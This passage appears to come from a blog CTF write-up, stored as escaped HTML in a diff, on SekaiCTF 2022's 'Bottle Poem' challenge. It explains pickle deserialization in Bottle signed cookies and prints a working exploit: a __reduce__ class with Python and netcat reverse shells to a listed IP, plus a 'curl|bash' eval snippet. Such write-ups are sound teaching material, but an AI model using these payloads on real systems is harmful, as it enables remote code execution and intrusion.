+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">secret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sekai&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">session&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;guest&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;guest&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">secret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sekai&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;guest&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;pls no hax&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">chdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dirname&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__file__&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap&lt;/p>
+&lt;p>The hint said flag is executable, meaning RCE is possible.&lt;/p>
+&lt;h2 id="basic">Basic&lt;/h2>
+&lt;p>Let&amp;rsquo;s have a look at Python Bottle&lt;/p>
+&lt;h3 id="python-bottle">Python Bottle&lt;/h3>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_2da4d05bf295c508b55d3bf0008f3835.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_9aede7e11bf7c26d14866bd091e5edc0.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_2da4d05bf295c508b55d3bf0008f3835.webp"
+width="760"
+height="673"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h4 id="bottle-signed-cookie">Bottle signed cookie&lt;/h4>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_a8f693444e40046bd1eee2826e10647d.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_ead85bc611860f2da16d91ae787d9285.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_a8f693444e40046bd1eee2826e10647d.webp"
+width="760"
+height="418"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+Bottle first:&lt;/p>
+&lt;ul>
+&lt;li>pickle.dumps([name, value], -1) then base64 encode → encoded&lt;/li>
+&lt;li>hmac encrypt the secret seperately then base64 encode → signature&lt;/li>
+&lt;li>add ‘!’ at the first char and ‘?’ in between signature&lt;/li>
+&lt;/ul>
+&lt;p>Cookie format: !&lt;strong>secret_hmac_base64&lt;/strong>==?&lt;strong>pickle_name_value_base64&lt;/strong>==&lt;/p>
+&lt;h4 id="bottle-verify-cookie">Bottle verify cookie&lt;/h4>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_5dfcde79c797c3caa19c73b2b095daa5.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_50867633a80be09520027d09a77e6a09.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_5dfcde79c797c3caa19c73b2b095daa5.webp"
+width="760"
+height="485"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+get_cookie:&lt;/p>
+&lt;ul>
+&lt;li>…&lt;/li>
+&lt;li>base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1))&lt;/li>
+&lt;/ul>
+&lt;p>We have controlled the value input through cookie&lt;/p>
+&lt;h3 id="pickle-exploit">Pickle exploit&lt;/h3>
+&lt;p>&lt;a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" target="_blank" rel="noopener">Ref&lt;/a>
+Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">pickled&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pickle&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dumps&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;pickle&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;me&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="nn">pickletools&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">pickletools&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pickled&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x80&lt;/span> &lt;span class="n">PROTO&lt;/span> &lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x95&lt;/span> &lt;span class="n">FRAME&lt;/span> &lt;span class="mi">25&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">11&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="n">EMPTY_LIST&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x94&lt;/span> &lt;span class="n">MEMOIZE&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">as&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">13&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">MARK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">14&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x8c&lt;/span> &lt;span class="n">SHORT_BINUNICODE&lt;/span> &lt;span class="s1">&amp;#39;pickle&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">22&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x94&lt;/span> &lt;span class="n">MEMOIZE&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">as&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">23&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x8c&lt;/span> &lt;span class="n">SHORT_BINUNICODE&lt;/span> &lt;span class="s1">&amp;#39;me&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">27&lt;/span>&lt;span class="p">:&lt;/span> \&lt;span class="n">x94&lt;/span> &lt;span class="n">MEMOIZE&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">as&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">28&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">K&lt;/span> &lt;span class="n">BININT1&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">30&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">K&lt;/span> &lt;span class="n">BININT1&lt;/span> &lt;span class="mi">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">32&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">K&lt;/span> &lt;span class="n">BININT1&lt;/span> &lt;span class="mi">3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">34&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">e&lt;/span> &lt;span class="n">APPENDS&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">MARK&lt;/span> &lt;span class="n">at&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">35&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="n">STOP&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>pickle still allows you to define a custom behavior for the pickling process for your class instances.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">The __reduce__() method takes no argument and shall return either a string or
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">preferably a tuple (the returned object is often referred to as the “reduce value”).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[…] When a tuple is returned, it must be between two and six items long.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Optional items can either be omitted, or None can be provided as their value.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The semantics of each item are in order:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A callable object that will be called to create the initial version of the object.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A tuple of arguments for the callable object. An empty tuple must be given if the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">callable does not accept any argument. […]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So by implementing &lt;code>__reduce__&lt;/code> in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.&lt;/p>
+&lt;p>So if any value in the array pass into pickle.dumps is an instance containing &lt;code>__reduce__&lt;/code>(…) function, that reduce will be executed when calling pickle.loads(…). And the &lt;code>__reduce__&lt;/code>(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.&lt;/p>
+&lt;p>So by implement reduce method that &lt;code>return (eval, ('__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;curl xxx|bash&amp;quot;)',))&lt;/code> , we can execute code on the server.&lt;/p>
+&lt;h2 id="the-exercise-step">The exercise step&lt;/h2>
+&lt;h3 id="generate-cookie">Generate cookie&lt;/h3>
+&lt;p>Add an class definition with &lt;code>__reduce__&lt;/code> method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">RCE&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">__reduce__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 14.186.174.164&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 14.186.174.164 55555 &amp;gt; /tmp/f&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;14.186.174.164&amp;#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">),)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Test&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/sign&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">secret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sekai&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">session&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;guest&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">objWithReduce&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RCE&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;guest&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">objWithReduce&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">session1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">secret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sekai&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;guest&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Running server and go to /sign with the Guest cookie to get the new Cookie with RCE instance dumps&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_50ea3b0d6c1d8051fae598963c570d69.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_f3a2c5fbfc427a6ee05ab2a6207f5e41.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_50ea3b0d6c1d8051fae598963c570d69.webp"
+width="760"
+height="210"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;!-- &lt;script type="application/javascript" src="https://gist.github.com/hdthinh1012/1244973789752ff62c2956e9698570eb.js">&lt;/script>
+-->
+&lt;p>In Attackbox, open netcat listener at port 55555:
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_88d9b11d261b0e0828bc5ac9c1b4c597.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_9d02d5dc09aebfc848283ccd7a41080a.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_88d9b11d261b0e0828bc5ac9c1b4c597.webp"
+width="760"
+height="210"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Request to the SekaiCTF with RCE cookie
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_8844974782186e39b049b7f1faef2d50.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_145d5943f78ef9862b04919be3abbcd0.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_8844974782186e39b049b7f1faef2d50.webp"
+width="760"
+height="210"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Netcat listener now receive reverse shell 😄 :
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_1cb0f3b7fb7fd3e45d6df767d2234c2a.webp 400w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_0f6429fdcc19d3d43a95f918c2cd1ed4.webp 760w,
+/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
+src="https://blog.bkisc.com/bkisc.com-blog-page/bkisc.com-blog-page/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_1cb0f3b7fb7fd3e45d6df767d2234c2a.webp"
+width="760"
+height="465"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="reference-links">Reference Links&lt;/h2>
+&lt;p>Reverse Shell / Bind Shell:&lt;/p>
+&lt;p>&lt;a href="https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/" target="_blank" rel="noopener">https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/" target="_blank" rel="noopener">https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/&lt;/a>&lt;/p>
